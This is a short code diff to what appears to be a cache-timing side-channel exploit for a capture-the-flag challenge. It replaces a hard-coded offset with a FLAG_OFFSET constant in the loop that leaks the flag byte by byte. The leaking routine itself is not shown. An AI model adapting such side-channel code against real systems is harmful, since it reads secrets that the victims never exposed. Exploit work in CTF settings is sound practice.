@@ -20,6 +20,7 @@
 #define PAGE_SIZE 0x1000UL
 #define NUM_PAGES 256
 #define ATTEMPTS 1000
+#define FLAG_OFFSET 6
 
 static volatile unsigned char *shared_mem;
 
@@ -178,7 +179,7 @@ int main(void)
     size_t len = 0;
 
     uint64_t threshold = calibrate_threshold();
-    for (unsigned target = 6; target < 6 + 64; ++target)
+    for (unsigned target = FLAG_OFFSET; target < FLAG_OFFSET + 64; ++target)
     {
         flag[len++] = leak_byte(fd, target, threshold);
         flag[len] = '\0';
